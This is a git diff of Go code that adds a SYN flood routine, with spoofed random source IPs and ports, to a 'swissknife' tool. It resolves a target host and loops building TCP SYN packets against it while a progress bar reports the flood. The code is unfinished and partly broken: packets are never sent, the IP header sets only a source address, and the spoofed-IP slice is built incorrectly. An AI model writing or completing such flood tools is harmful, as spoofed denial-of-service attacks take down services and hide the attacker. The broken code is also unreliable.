@@ -2,13 +2,16 @@ package synflood
 
 import (
 	"context"
+	"fmt"
 	"math/rand"
 	"net"
 	"time"
 
 	"github.com/didof/swissknife/internal/logger"
 	"github.com/didof/swissknife/internal/version"
+	"github.com/google/gopacket/layers"
 	"github.com/pkg/errors"
+	progressbar "github.com/schollz/progressbar/v3"
 	"go.uber.org/zap"
 )
 
@@ -64,12 +67,35 @@ var ErrDNSLookup = errors.New("dns lookup")
 func do(ctx context.Context, host string, opts SynFloodOptions) error {
 	rand.Seed(time.Now().Unix())
 
-	_, err := resolveHost(ctx, host)
+	dstIp, err := resolveHost(ctx, host)
 	if errors.Is(err, ErrDNSLookup) {
 		return errors.Wrap(err, "unable to resolve host")
 	}
 
-	return nil
+	description := fmt.Sprintf("Flood is in progress, target=%s:%d, payloadLength=%d",
+		host, opts.Port, opts.PayloadLength)
+	bar := progressbar.DefaultBytes(-1, description)
+
+	ipsSpoofer := newIpsSpoofer(20)
+	portsSpoofer := newPortsSpoofer()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return nil
+		default:
+			tcpPacket := createTcpPacket(portsSpoofer.rand(), opts.Port)
+			ipPacket := createIpPacket(ipsSpoofer.rand(), dstIp)
+
+			if err := tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
+				return err
+			}
+
+			if err := bar.Add(opts.PayloadLength); err != nil {
+				return errors.Wrap(err, "unable to increase bar length")
+			}
+		}
+	}
 }
 
 func resolveHost(ctx context.Context, input string) (net.IP, error) {
@@ -87,4 +113,33 @@ func resolveHost(ctx context.Context, input string) (net.IP, error) {
 	log.Debug("DNS lookup succeeded", zap.String("DNS", input), zap.String("IP", ip.String()))
 
 	return ip, nil
+}
+
+func generateSpoofedIps(n int) []net.IP {
+	ips := make([]net.IP, n)
+	getRand256 := func() int {
+		return rand.Intn(256)
+	}
+	for i := 0; i < n; i++ {
+		spoofIp := net.ParseIP(fmt.Sprintf("%d.%d.%d.%d", getRand256(), getRand256(), getRand256(), getRand256()))
+		ips = append(ips, spoofIp)
+	}
+	return ips
+}
+
+func createTcpPacket(srcPort int, dstPort int) *layers.TCP {
+	return &layers.TCP{
+		SrcPort: layers.TCPPort(srcPort),
+		DstPort: layers.TCPPort(dstPort),
+		Window:  14600,      // TODO what is this?
+		Seq:     1105024978, // TODO what is this?
+		SYN:     true,
+		ACK:     false,
+	}
+}
+
+func createIpPacket(srcIp, dstIp net.IP) *layers.IPv4 {
+	return &layers.IPv4{
+		SrcIP: srcIp,
+	}
 }
